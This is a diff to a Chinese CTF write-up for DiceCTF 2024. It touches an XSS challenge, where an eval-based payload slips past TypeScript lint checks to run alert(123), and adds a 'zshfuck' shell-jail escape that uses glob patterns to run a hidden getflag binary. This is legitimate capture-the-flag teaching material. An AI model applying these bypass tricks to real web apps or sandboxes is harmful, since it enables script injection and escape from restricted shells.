@@ -423,7 +423,7 @@ Flag: `dice{society_if_typescript_were_sound}`
 
 创建了一个函数，接收一个元素类型为 `number` 或 `string` 的数组作为参数，在函数内部判断首个元素是否是 `number` 类型，如果是的话就调用另一个函数。
 
-`#!ts (y => { y[0]='*' })` 函数将参数 `y` 的首元素换成了 `'*'`，所以 `#!ts ( (y => { y[0]='*' })(x), x[0] )` 相当于返回了 `#!ts '*'` 字符串。
+`#!ts (y => { y[0]='*' })` 函数将参数 `#!ts y` 的首元素换成了 `#!ts '*'`，所以 `#!ts ( (y => { y[0]='*' })(x), x[0] )` 相当于返回了 `#!ts '*'` 字符串。
 
 所以整体就是返回 `#!ts '*'` 字符串，应该是可以修改这个位置的内容来 XSS。
 
@@ -455,12 +455,12 @@ URL 需要缩短一下，推荐 [t.ly](https://t.ly/)
 
 Flag: `dice{learning-how-eslint-works}`
 
-在这之后，我又找到一个 writeup：[nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003#Web-272-another-csp-16-solves](https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003#Web-272-another-csp-16-solves)
+在这之后，我又找到一个 writeup：[nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003](https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003)
 
 它有利用 `eval` 的解决方法。
 
 !!! quote
-    なかなかアイデアが出てこなかった。急に、`eval` を使っているけれども、常に `number` が返ってくるように見えるようなコードを使うのはどうかと思いついた。ただ eval を呼び出すだけだと当然 "Unsafe return of an any typed value." と怒られてしまうけれども、以下のように無理やり `eval` の返り値を数値に変換してやれば、トランスパイラは見逃してくれる。`eval` の実行時に何が起こっていようが気にはしない。
+    なかなかアイデアが出てこなかった。急に、`eval` を使っているけれども、常に `number` が返ってくるように見えるようなコードを使うのはどうかと思いついた。ただ `eval` を呼び出すだけだと当然 "Unsafe return of an any typed value." と怒られてしまうけれども、以下のように無理やり `eval` の返り値を数値に変換してやれば、トランスパイラは見逃してくれる。`eval` の実行時に何が起こっていようが気にはしない。
 
     ```ts
     +eval('[].join("fuga")')
@@ -472,26 +472,26 @@ Flag: `dice{learning-how-eslint-works}`
     (x=>+eval(`Number=String`)+Number(x))('abc')
     ```
 
-    これを利用して、以下のコードで alert(123) というコードを実行できた。
+    これを利用して、以下のコードで `alert(123)` というコードを実行できた。
 
     ```ts
     (x=>+eval(`Number=String`)+Number(x))('<script>alert(123)</script>')
     ```
 
 ??? quote "翻译自 GPT"
-    我一直没有什么好主意。突然，我想到了使用 eval，虽然它看起来总是返回数字。但如果只是简单地调用 eval，显然会被警告说 "Unsafe return of an any typed value." 但如果我们强行将 eval 的返回值转换成数字，就可以让转译器忽略这个问题。eval 在执行时无论发生什么都不在乎。
+    我一直没有什么好主意。突然，我想到了使用 `eval`，虽然它看起来总是返回数字。但如果只是简单地调用 `eval`，显然会被警告说 "Unsafe return of an any typed value." 但如果我们强行将 `eval` 的返回值转换成数字，就可以让转译器忽略这个问题。`eval` 在执行时无论发生什么都不在乎。
 
     ```ts
     +eval('[].join("fuga")')
     ```
 
-    利用这一点，我们可以在 eval 中为所欲为。下面的代码实际上是将 `Number` 替换成了 `String`，所以返回值会变成 `NaNabc`。但是，在类型推断中，不会考虑 `eval` 中会发生什么，所以假定 `Number` 不会被替换，认为返回值是数字，因此不会出现问题。
+    利用这一点，我们可以在 `eval` 中为所欲为。下面的代码实际上是将 `Number` 替换成了 `String`，所以返回值会变成 `NaNabc`。但是，在类型推断中，不会考虑 `eval` 中会发生什么，所以假定 `Number` 不会被替换，认为返回值是数字，因此不会出现问题。
 
     ```ts
     (x=>+eval(Number=String)+Number(x))('abc')
     ```
 
-    利用这一点，下面的代码可以执行 alert(123)。
+    利用这一点，下面的代码可以执行 `alert(123)`。
 
     ```ts
     (x=>+eval(`Number=String`)+Number(x))('<script>alert(123)</script>')
@@ -570,7 +570,104 @@ info: setting *0x55a3cdfecee0 to 0x1312d00...
 
 Flag: `dice{your_flag_is_not_in_another_castle}`
 
-## 引用
+## Misc
+
+### zshfuck
+
+参考 write-up：
+
+- [github.com/quasar098/ctf-writeups/blob/main/dicectf-2024/zshfuck/README.md](https://github.com/quasar098/ctf-writeups/blob/main/dicectf-2024/zshfuck/README.md)
+- [ctf.krauq.com/dicectf-2024#zshfuck-107-solves](https://ctf.krauq.com/dicectf-2024#zshfuck-107-solves)
+
+```zsh
+#!/bin/zsh
+print -n -P "%F{green}Specify your charset: %f"
+read -r charset
+# get uniq characters in charset
+charset=("${(us..)charset}")
+banned=('*' '?' '`')
+
+if [[ ${#charset} -gt 6 || ${#charset:|banned} -ne ${#charset} ]]; then
+    print -P "\n%F{red}That's too easy. Sorry.%f\n"
+    exit 1
+fi
+print -P "\n%F{green}OK! Got $charset.%f"
+charset+=($'\n')
+
+# start jail via coproc
+coproc zsh -s
+exec 3>&p 4<&p
+
+# read chars from fd 4 (jail stdout), print to stdout
+while IFS= read -u4 -r -k1 char; do
+    print -u1 -n -- "$char"
+done &
+# read chars from stdin, send to jail stdin if valid
+while IFS= read -u0 -r -k1 char; do
+    if [[ ! ${#char:|charset} -eq 0 ]]; then
+        print -P "\n%F{red}Nope.%f\n"
+        exit 1
+    fi
+    # send to fd 3 (jail stdin)
+    print -u3 -n -- "$char"
+done
+```
+
+我们可以指定六个字符作为字符集，不包括 `*`、`?`、`` ` ``，然后我们可以用字符集内的字符向 zsh 发送命令并获得输出。
+
+先需要找到 `getflag` 文件的位置，可以使用 `find /` 或者 `grep -r g` (1)
+{ .annotate }
+
+1. `g` 可以替换为字符集中的 `r`、`e`、`p`
+
+```shell
+$ echo -e "find /\nfind /" | nc mc.ax 31774 | grep flag
+/app/y0u/w1ll/n3v3r_g3t/th1s/getflag
+```
+
+接下来需要想办法匹配文件路径。
+
+!!! quote "GPT"
+    在 Zsh（Z Shell）中，匹配文件名是一个常见的操作，可以使用多种模式匹配和通配符来实现。以下是一些基本的方法和示例：
+
+    - 基本通配符:
+
+        - `*` 匹配任意数量的任意字符。例如，`*.txt` 匹配所有以 `.txt` 结尾的文件。
+        - `?` 匹配任意单个字符。例如，`?.txt` 匹配所有单个字符后跟 `.txt` 的文件。
+        - `[...]` 匹配任意一个括号内的字符。例如，`[ab]*` 匹配以 `a` 或 `b` 开头的任意文件。
+
+    - 扩展通配符 (需要使用 setopt EXTENDED_GLOB 启用):
+
+        - `^` 或 `!` 用于取反。例如，`*.txt(^*.bak)` 匹配所有 `.txt` 文件，除了以 `.bak` 结尾的文件。
+        - `#` 用作量词，与正则表达式中的 `*`、`+` 类似。例如，`?(#1,2)` 匹配 1 到 2 个 `?` 代表的字符。
+        - `~` 用于排除模式。例如，`*~*.bak` 匹配所有非 `.bak` 结尾的文件。
+
+    - 递归匹配:
+
+        - `**` 用于递归匹配。例如，`**/*.txt` 匹配当前目录及所有子目录下的 `.txt` 文件。
+
+使用 `[^z]` 匹配任意一个不是 `z` 的字符，那么文件路径应该表示为：
+
+```zsh
+/[^z][^z][^z]/[^z][^z][^z]/[^z][^z][^z][^z]/[^z][^z][^z][^z][^z][^z][^z][^z][^z]/[^z][^z][^z][^z]/[^z][^z][^z][^z][^z][^z][^z]
+```
+
+字符集只用到五位：`/`、`[`、`^`、`z`、`]`
+
+```zsh
+$ nc mc.ax 31774
+Specify your charset: /[^z]
+
+OK! Got / [ ^ z ].
+/[^z][^z][^z]/[^z][^z][^z]/[^z][^z][^z][^z]/[^z][^z][^z][^z][^z][^z][^z][^z][^z]/[^z][^z][^z][^z]/[^z][^z][^z][^z][^z][^z][^z]
+dice{d0nt_u_jU5T_l00oo0ve_c0d3_g0lf?}
+```
+
+Flag: `dice{d0nt_u_jU5T_l00oo0ve_c0d3_g0lf?}`
+
+## References
 
 - ouuan's write-up: [ouuan.moe/post/2024/02/dicectf-2024-quals](https://ouuan.moe/post/2024/02/dicectf-2024-quals)
 - st98's write-up: [nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003](https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003)
+- krauq's write-up: [ctf.krauq.com/dicectf-2024](https://ctf.krauq.com/dicectf-2024)
+- quasar098's write-up: [github.com/quasar098/ctf-writeups/blob/main/dicectf-2024/zshfuck/README.md](https://github.com/quasar098/ctf-writeups/blob/main/dicectf-2024/zshfuck/README.md)
